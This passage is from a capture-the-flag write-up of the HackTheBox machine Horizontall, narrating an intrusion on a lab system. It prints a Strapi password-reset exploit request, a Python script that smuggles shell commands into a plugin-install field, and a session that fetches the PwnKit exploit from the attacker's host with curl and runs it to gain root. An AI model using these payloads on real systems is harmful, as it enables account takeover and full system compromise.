/admin &lt;span class="o">(&lt;/span>Status: 200&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 854&lt;span class="o">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Very quickly, I found some hidden directories and went to check them out.&lt;/p>
&lt;h3 id="api-prodhorizontallhtbreviews">api-prod.horizontall.htb/reviews&lt;/h3>
&lt;p>Even though I was barred from checking out the much more interesting &lt;code>/users&lt;/code> endpoint, I wanted to see what &lt;code>/reviews&lt;/code> had in store also. Unfortunately, it wasn&amp;rsquo;t anything noteworthy, apart from a few usernames. They seemed more like customers than anything resembling a privileged user on the system, so I disregarded this lead as a red herring.&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 121;
flex-basis: 292px"
>
&lt;a href="https://weaponizedpeach.github.io/p/hackthebox-horizontall/reviews.png" data-size="604x496">
&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-horizontall/reviews.png"
width="604"
height="496"
srcset="https://weaponizedpeach.github.io/p/hackthebox-horizontall/reviews_hu89e081d61b3e6a8feac03d2140d4bf28_41878_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/hackthebox-horizontall/reviews_hu89e081d61b3e6a8feac03d2140d4bf28_41878_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Reviews">
&lt;/a>
&lt;figcaption>Reviews&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>&lt;code>/admin&lt;/code> seemed like the juiciest bit anyway, so let&amp;rsquo;s go there.&lt;/p>
&lt;h3 id="api-prodhorizontallhtbadmin">api-prod.horizontall.htb/admin&lt;/h3>
&lt;p>My hopes were reignited when I saw this login screen.&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 150;
flex-basis: 361px"
>
&lt;a href="https://weaponizedpeach.github.io/p/hackthebox-horizontall/admin_panel.png" data-size="777x516">
&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-horizontall/admin_panel.png"
width="777"
height="516"
srcset="https://weaponizedpeach.github.io/p/hackthebox-horizontall/admin_panel_hu0d412b9a24d6310f2d63d8bf439d19a6_19667_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/hackthebox-horizontall/admin_panel_hu0d412b9a24d6310f2d63d8bf439d19a6_19667_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Strapi CMS Admin Log-in">
&lt;/a>
&lt;figcaption>Strapi CMS Admin Log-in&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>Trying out a few commonly used passwords did not prove fruitful. Neither did the &amp;ldquo;Forgot your password?&amp;rdquo; screen.&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 124;
flex-basis: 299px"
>
&lt;a href="https://weaponizedpeach.github.io/p/hackthebox-horizontall/forgot_password.png" data-size="519x416">
&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-horizontall/forgot_password.png"
width="519"
height="416"
srcset="https://weaponizedpeach.github.io/p/hackthebox-horizontall/forgot_password_hu2c5b1067b373ff8e4e87998142086112_17208_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/hackthebox-horizontall/forgot_password_hu2c5b1067b373ff8e4e87998142086112_17208_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Strapi CMS &amp;lsquo;Forgot your password?&amp;#39;">
&lt;/a>
&lt;figcaption>Strapi CMS ‘Forgot your password?'&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>A search on &lt;code>exploit-db.com&lt;/code> for &lt;code>strapi CMS&lt;/code> returned three possible vulnerabilities - an unauthenticated password reset and two RCEs, one requiring authentication and one not. However, I did not know the version of Strapi used here. I was unsure whether or not the exploits would work.&lt;/p>
&lt;p>Before trying them out, since this is a log-in screen after all, SQL injection sprung into my mind. I booted up Burp Suite and sqlmap.&lt;/p>
&lt;h2 id="exploitation">Exploitation&lt;/h2>
&lt;h3 id="sqlmap-with-burp-suite-rabbit-hole">sqlmap with Burp Suite (rabbit hole)&lt;/h3>
&lt;p>I saved a random login request with Burp for use with sqlmap:&lt;/p>
&lt;pre tabindex="0">&lt;code>POST /admin/auth/local HTTP/1.1
Host: api-prod.horizontall.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://api-prod.horizontall.htb/admin/auth/login
Content-Type: application/json
Origin: http://api-prod.horizontall.htb
Content-Length: 44
DNT: 1
Connection: close
{&amp;quot;identifier&amp;quot;:&amp;quot;admin&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;password&amp;quot;}
&lt;/code>&lt;/pre>&lt;p>However, sqlmap wasn&amp;rsquo;t successful neither with the &lt;code>identifier&lt;/code>, nor the &lt;code>password&lt;/code> field.&lt;/p>
&lt;p>Welp, time to try out that password reset and those RCEs.&lt;/p>
&lt;h3 id="set-password-unauthenticated">Set Password (Unauthenticated)&lt;/h3>
&lt;p>First of all, I tried &lt;a class="link" href="https://www.exploit-db.com/exploits/50237" target="_blank" rel="noopener"
>the password reset exploit&lt;/a> (CVE 2019-18818). My reasoning was to try this first, and the RCE exploits after, specifically, the one that requires authentication, I thought it might have a higher chance of success than the one not needing authentication.&lt;/p>
&lt;p>Unfortunately, the exploit&amp;rsquo;s Python script did not work correctly out of the box, I was hit by an error regarding the json package used. Not wanting to mess around with installing a different version of Python or reinstalling different packages, I skimmed through the code and found a point of interest.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[*] Password reset for user: &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">userEmail&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="n">resetPasswordReq&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;email&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">userEmail&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;url&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">/admin/plugins/users-permissions/auth/reset-password&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">strapiUrl&lt;/span>&lt;span class="p">)}&lt;/span>
&lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">post&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">/&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">strapiUrl&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">json&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">resetPasswordReq&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1"># Set new password&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[*] Setting new password&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">exploit&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;code&amp;#34;&lt;/span>&lt;span class="p">:{},&lt;/span> &lt;span class="s2">&amp;#34;password&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">newPassword&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;passwordConfirmation&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">newPassword&lt;/span>&lt;span class="p">}&lt;/span>
&lt;span class="n">r&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">post&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">/admin/auth/reset-password&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">strapiUrl&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">json&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">exploit&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The code seems to simply send a specially formatted JSON to the aforementioned &amp;lsquo;Forgot your password?&amp;rsquo; URL. Fortunately for me, I had just saved the login request with Burp Suite, when I was messing around with sqlmap. With a quick change of the &lt;code>Host:&lt;/code> header and swapping out the login JSON payload for the password reset one, I had my exploit ready to go:&lt;/p>
&lt;pre tabindex="0">&lt;code>POST /admin/auth/reset-password HTTP/1.1
Host: api-prod.horizontall.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://api-prod.horizontall.htb/admin/auth/login
Content-Type: application/json
Origin: http://api-prod.horizontall.htb
Content-Length: 146
DNT: 1
Connection: close
{&amp;quot;code&amp;quot; : {&amp;quot;$gt&amp;quot;:0},
&amp;quot;password&amp;quot; : &amp;quot;SuperStrongPassword1&amp;quot;,
&amp;quot;passwordConfirmation&amp;quot; : &amp;quot;SuperStrongPassword1&amp;quot;
}
&lt;/code>&lt;/pre>&lt;p>I hit send on Burp Suite and cross my fingers&amp;hellip;&lt;/p>
&lt;p>I&amp;rsquo;m met with a &lt;code>200 OK&lt;/code> reply! Along with an accompanying &lt;code>JWT&lt;/code> token, admin username and email address!&lt;/p>
&lt;pre tabindex="0">&lt;code>HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 04 Feb 2022 17:42:52 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 249
Connection: close
Vary: Origin
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Content-Security-Policy: img-src 'self' http:; block-all-mixed-content
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Powered-By: Strapi &amp;lt;strapi.io&amp;gt;
{&amp;quot;jwt&amp;quot;:&amp;quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzOTk2NTcyLCJleHAiOjE2NDY1ODg1NzJ9.38OEmWdTXIBVRZid4mcY6JeZ2pBV4GQi2_SMHGafhec&amp;quot;,&amp;quot;user&amp;quot;:{&amp;quot;id&amp;quot;:3,&amp;quot;username&amp;quot;:&amp;quot;admin&amp;quot;,&amp;quot;email&amp;quot;:&amp;quot;admin@horizontall.htb&amp;quot;,&amp;quot;blocked&amp;quot;:null}}
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s try that log-in now :3&lt;/p>
&lt;h3 id="admin-log-in--api-prodhorizontallhtbadmin">Admin log-in @ api-prod.horizontall.htb/admin&lt;/h3>
&lt;p>Logging in with the &lt;code>SuperStrongPassword1&lt;/code> after the password reset exploit proved successful. I landed in what seemed like an admin dashboard.&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 174;
flex-basis: 419px"
>
&lt;a href="https://weaponizedpeach.github.io/p/hackthebox-horizontall/strapi_admin_dashboard.png" data-size="1391x796">
&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-horizontall/strapi_admin_dashboard.png"
width="1391"
height="796"
srcset="https://weaponizedpeach.github.io/p/hackthebox-horizontall/strapi_admin_dashboard_hu5215d02829d117578881902a41d6f4b7_91481_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/hackthebox-horizontall/strapi_admin_dashboard_hu5215d02829d117578881902a41d6f4b7_91481_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Strapi CMS Admin Dashboard">
&lt;/a>
&lt;figcaption>Strapi CMS Admin Dashboard&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>What instantly caught my eye was the &lt;code>Files Upload&lt;/code> tab in the Plugins section. Sure enough, I could upload a file. I went to &lt;a class="link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" target="_blank" rel="noopener"
>PayloadsAllTheThings&lt;/a> for inspiration, crafted and uploaded myself a PHP reverse shell payload.&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 322;
flex-basis: 773px"
>
&lt;a href="https://weaponizedpeach.github.io/p/hackthebox-horizontall/reverse_shell_upload.png" data-size="1376x427">
&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-horizontall/reverse_shell_upload.png"
width="1376"
height="427"
srcset="https://weaponizedpeach.github.io/p/hackthebox-horizontall/reverse_shell_upload_hue0d086e339ad1c9e87d9123034997634_45945_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/hackthebox-horizontall/reverse_shell_upload_hue0d086e339ad1c9e87d9123034997634_45945_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="Reverse shell upload">
&lt;/a>
&lt;figcaption>Reverse shell upload&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>Unfortunately, I did not have much success with uploaded files getting to run. Without dwelling too much on it, I decided to try out the RCE exploits I found before. The Strapi version didn&amp;rsquo;t seem that different from the password reset exploit, so I had fairly high hopes.&lt;/p>
&lt;h3 id="remote-code-execution-rce-authenticated--user-flag">Remote Code Execution (RCE) (Authenticated) &amp;amp; User Flag&lt;/h3>
&lt;p>While working with &lt;a class="link" href="https://www.exploit-db.com/exploits/50238" target="_blank" rel="noopener"
>the RCE exploit&lt;/a> I also again encountered some Python weirdness. Mostly regarding the &lt;code>JWT&lt;/code> token. I was used to it at this point, so I just duct-taped bits and pieces of both RCE exploits, as they seemed to target the same &lt;code>/admin/plugins/install&lt;/code> path, hard-coded in the &lt;code>JWT&lt;/code> and target &lt;code>URL&lt;/code>. At the end, it looked like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="kn">import&lt;/span> &lt;span class="nn">requests&lt;/span>
&lt;span class="kn">from&lt;/span> &lt;span class="nn">cmd&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Cmd&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">Terminal&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Cmd&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">prompt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;$&amp;gt; &amp;#34;&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">default&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">code_exec&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">code_exec&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">cmd&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="k">global&lt;/span> &lt;span class="n">jwt&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">url&lt;/span>
&lt;span class="n">jwt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzOTk4MTkwLCJleHAiOjE2NDY1OTAxOTB9.fw_8CAfFHcZbgprQaa9LTA771Vz0UI6WyvgvynMKYyI&amp;#34;&lt;/span>
&lt;span class="n">url&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;http://api-prod.horizontall.htb&amp;#34;&lt;/span>
&lt;span class="n">headers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;Authorization&amp;#34;&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;Bearer &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">jwt&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;span class="n">data&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;plugin&amp;#34;&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;documentation &amp;amp;&amp;amp; $(&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">cmd&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">)&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s2">&amp;#34;port&amp;#34;&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;1337&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;span class="n">out&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">post&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">url&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">/admin/plugins/install&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">json&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">headers&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">headers&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">out&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">text&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">terminal&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">Terminal&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="n">terminal&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">cmdloop&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>While the exploit did seem to do something, it would always respond with a &amp;ldquo;Bad Request&amp;rdquo; HTTP reply, instead of the output of &lt;code>id&lt;/code> or whatever else I tried to execute. I then tried to give myself a proper reverse shell. I used &lt;a class="link" href="https://www.revshells.com/" target="_blank" rel="noopener"
>RevShells&lt;/a> to help me out crafting the command itself.&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 138;
flex-basis: 332px"
>
&lt;a href="https://weaponizedpeach.github.io/p/hackthebox-horizontall/user_access.png" data-size="812x586">
&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-horizontall/user_access.png"
width="812"
height="586"
srcset="https://weaponizedpeach.github.io/p/hackthebox-horizontall/user_access_huc41e0aca776927cdfc1dbecad7234be1_383288_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/hackthebox-horizontall/user_access_huc41e0aca776927cdfc1dbecad7234be1_383288_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="User Access">
&lt;/a>
&lt;figcaption>User Access&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>And I got myself a shell! I checked out &lt;code>/home&lt;/code> and grabbed the user flag :)&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 141;
flex-basis: 340px"
>
&lt;a href="https://weaponizedpeach.github.io/p/hackthebox-horizontall/user_flag.png" data-size="499x352">
&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-horizontall/user_flag.png"
width="499"
height="352"
srcset="https://weaponizedpeach.github.io/p/hackthebox-horizontall/user_flag_hu4696c75310cd6fca07c6667278436783_172314_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/hackthebox-horizontall/user_flag_hu4696c75310cd6fca07c6667278436783_172314_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="User Flag">
&lt;/a>
&lt;figcaption>User Flag&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>It was now time to try and get root access.&lt;/p>
&lt;h2 id="privilege-escalation">Privilege Escalation&lt;/h2>
&lt;h3 id="sudo-and-suid-enumeration">SUDO and SUID enumeration&lt;/h3>
&lt;p>One of the ways to privesc to root, that require very little effort, is finding easily exploitable binaries that we can either run as SUDO or that have their SUID bit set on.&lt;/p>
&lt;p>Let&amp;rsquo;s look for SUDO access first.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">sudo -l
&lt;/code>&lt;/pre>&lt;/div>&lt;p>I was requested a password, so this avenue won&amp;rsquo;t work.&lt;/p>
&lt;p>Next, I tried to look for easily exploitable binaries with SUID bits.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">find / -perm -u&lt;span class="o">=&lt;/span>s -type f 2&amp;gt;/dev/null
&lt;/code>&lt;/pre>&lt;/div>&lt;p>I tried cross-referencing the output with the SUID list over at &lt;a class="link" href="https://gtfobins.github.io/#&amp;#43;suid" target="_blank" rel="noopener"
>GTFOBins&lt;/a>, but did not find anything out of the ordinary.&lt;/p>
&lt;h3 id="linux-exploit-suggester">Linux Exploit Suggester&lt;/h3>
&lt;p>On my host machine, I made myself an SSH key and pasted the public key over into .ssh/authorized_keys on the strapi account. I could now log-in via SSH normally and not rely on the fragile reverse shell anymore.&lt;/p>
&lt;p>Next, I &lt;code>curl&lt;/code>&amp;rsquo;d myself the &lt;a class="link" href="https://github.com/mzet-/linux-exploit-suggester" target="_blank" rel="noopener"
>Linux Exploit Suggester&lt;/a> onto the remote machine and let it do its thing.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">strapi@horizontall:~$ ./les.sh
Available information:
Kernel version: 4.15.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 18.04
Additional checks &lt;span class="o">(&lt;/span>CONFIG_*, sysctl entries, custom Bash commands&lt;span class="o">)&lt;/span>: performed
Package listing: from current OS
Searching among:
&lt;span class="m">78&lt;/span> kernel space exploits
&lt;span class="m">49&lt;/span> user space exploits
Possible Exploits:
&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>CVE-2021-4034&lt;span class="o">]&lt;/span> PwnKit
Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
Exposure: probable
Tags: &lt;span class="o">[&lt;/span> &lt;span class="nv">ubuntu&lt;/span>&lt;span class="o">=&lt;/span>10&lt;span class="p">|&lt;/span>11&lt;span class="p">|&lt;/span>12&lt;span class="p">|&lt;/span>13&lt;span class="p">|&lt;/span>14&lt;span class="p">|&lt;/span>15&lt;span class="p">|&lt;/span>16&lt;span class="p">|&lt;/span>17&lt;span class="p">|&lt;/span>18&lt;span class="p">|&lt;/span>19&lt;span class="p">|&lt;/span>20&lt;span class="p">|&lt;/span>&lt;span class="m">21&lt;/span> &lt;span class="o">]&lt;/span>,debian&lt;span class="o">=&lt;/span>7&lt;span class="p">|&lt;/span>8&lt;span class="p">|&lt;/span>9&lt;span class="p">|&lt;/span>10&lt;span class="p">|&lt;/span>11,fedora,manjaro
Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Seeing the PwnKit exploit pop-up made me smile. I was listening to &lt;a class="link" href="https://open.spotify.com/show/6oeUmMwv1AQpdYNHmOE4A0" target="_blank" rel="noopener"
>SANS Internet Stormcenter Podcast&lt;/a> a few days ago and heard about a new &lt;code>pollkit&lt;/code> exploit (&lt;code>&amp;quot;PwnKit&amp;quot;&lt;/code> &lt;a class="link" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034" target="_blank" rel="noopener"
>CVE-2021-4034&lt;/a>) floating around, making pretty much every single Linux machine vulnerable since 2009. This makes a lot of the CTF machines vulnerable to something other than what was likely intended by its designer. I pondered on looking for the &amp;lsquo;intended&amp;rsquo; exploit, but I had spent a considerable amount of time just getting to this point, I knew that getting root access otherwise would take me equally as long if the journey there was as involved as getting the initial foothold. I decided that an exploit is an exploit and just went with the PwnKit route.&lt;/p>
&lt;h3 id="pwnkit--system-flag">PwnKit &amp;amp; System Flag&lt;/h3>
&lt;p>Applying the exploit was trivial. &lt;code>LES&lt;/code> had even given me a download link. And just like with &lt;code>LES&lt;/code>, I &lt;code>curl&lt;/code>&amp;rsquo;d myself the exploit onto the remote machine and ran it. The exploit zoomed by extremely quickly, and I was now &lt;code>root&lt;/code>. I went and snatched the system flag. And that&amp;rsquo;s it for Horizontall.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">strapi@horizontall:~$ curl 10.10.14.130:8080/pwnkit -o pwnkit
% Total % Received % Xferd Average Speed Time Time Time Current
Dload Upload Total Spent Left Speed
&lt;span class="m">100&lt;/span> &lt;span class="m">14688&lt;/span> &lt;span class="m">100&lt;/span> &lt;span class="m">14688&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="m">0&lt;/span> 103k &lt;span class="m">0&lt;/span> --:--:-- --:--:-- --:--:-- 103k
strapi@horizontall:~$ chmod +x pwnkit
strapi@horizontall:~$ ./pwnkit
root@horizontall:/opt/strapi# id
&lt;span class="nv">uid&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="o">(&lt;/span>root&lt;span class="o">)&lt;/span> &lt;span class="nv">gid&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="o">(&lt;/span>root&lt;span class="o">)&lt;/span> &lt;span class="nv">groups&lt;/span>&lt;span class="o">=&lt;/span>0&lt;span class="o">(&lt;/span>root&lt;span class="o">)&lt;/span>,1001&lt;span class="o">(&lt;/span>strapi&lt;span class="o">)&lt;/span>
root@horizontall:/opt/strapi# whoami
root
root@horizontall:/opt/strapi# &lt;span class="nb">cd&lt;/span> ~
root@horizontall:~# ls
boot.sh pid restart.sh root.txt
root@horizontall:~# cat root.txt
ed9440c3385bdec9f943c2cc3c0af71e
root@horizontall:~#
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;em>&lt;strong>NOTE:&lt;/strong>&lt;/em> If you would like to read the &amp;lsquo;intended&amp;rsquo; or &amp;lsquo;proper&amp;rsquo; way of the gaining &lt;code>root&lt;/code> access, involving a Laravel Debug Mode RCE, I strongly recommend &lt;a class="link" href="https://0xdf.gitlab.io/2022/02/05/htb-horizontall.html" target="_blank" rel="noopener"
>0xdf&amp;rsquo;s writeup of Horizontall&lt;/a>.&lt;/p>
&lt;h2 id="outro">Outro&lt;/h2>
&lt;p>And that&amp;rsquo;s that. In the future, I will probably go through HackTheBox&amp;rsquo;s &amp;lsquo;Starting Point&amp;rsquo; set of machines. I planned on doing so from the start, but I wanted to try my hand at one of the &amp;lsquo;Easy&amp;rsquo; boxes rather than going for the &amp;lsquo;Very Easy&amp;rsquo; ones, to give myself a sort of reality check and to better gauge how much knowledge and understanding I have right now.&lt;/p>
&lt;p>Whilst doing this box, not counting the PwnKit exploit, I feel like I went the hard way about it. There were faster, less conspicuous and smarter way to achieve the same result. The &lt;code>api-prod&lt;/code> subdomain was hidden in one of the minified &lt;code>.js&lt;/code> files of the landing page, for example, thus avoiding the lengthy brute-forcing of subdomains.&lt;/p>
&lt;p>I was pretty easily led astray by various red herrings, like the file upload plugin on the admin dashboard or after seeing the version of the SSH service. However, I&amp;rsquo;m still a beginner, so I believe noticing these things sooner requires time and experience.&lt;/p>
&lt;p>All in all, I feel like I have many areas to improve in, but at the same time, I&amp;rsquo;m glad I didn&amp;rsquo;t got completely stumped by one of the slightly more challenging boxes. :)&lt;/p></description></item></channel></rss>